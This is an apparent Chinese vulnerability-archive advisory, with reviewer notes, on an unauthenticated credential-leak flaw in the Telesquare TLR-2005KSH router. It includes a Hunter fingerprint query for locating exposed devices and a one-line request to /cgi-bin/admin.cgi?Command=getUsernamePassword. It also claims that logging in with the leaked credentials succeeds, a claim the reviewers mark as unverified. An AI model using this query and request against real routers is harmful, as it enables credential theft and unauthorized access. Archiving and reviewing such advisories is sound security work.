---
source: "wy876 漏洞文库"
id: "vw-8b26154d0650df7564750227"
entity_id: "ve-8b26154d0650df7564750227"
schema_version: "1"
title: "Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露漏洞"
product: "Telesquare TLR-2005KSH"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未列固件，声称未认证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Telesquare/TelesquareTLR-2005Ksh%E8%B7%AF%E7%94%B1%E5%99%A8getUsernamePassword%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/awpgpcgce8hdzmr4"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"TLR-2005KSH\"||banner=\"TLR-2005KSH login:\""
---

# Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Telesquare TLR-2005KSH
- 本文讨论：admin.cgi getUsernamePassword未授权凭据读取
- 版本、权限与配置前提：未列固件，声称未认证
- 资料类型：凭据泄露接口摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅URL及成功登录主张无响应/验证证据
- fofa误录残缺Hunter规则，无修复来源
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 响应是否明文及会话前提待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。

# 二、影响版本
+ Telesquare Tlr-2005Ksh

# 三、资产测绘
+ hunter`web.title="TLR-2005KSH"||banner="TLR-2005KSH login:"`
+ 特征


# 四、漏洞复现
```plain
/cgi-bin/admin.cgi?Command=getUsernamePassword
```


使用账户密码成果登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/awpgpcgce8hdzmr4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
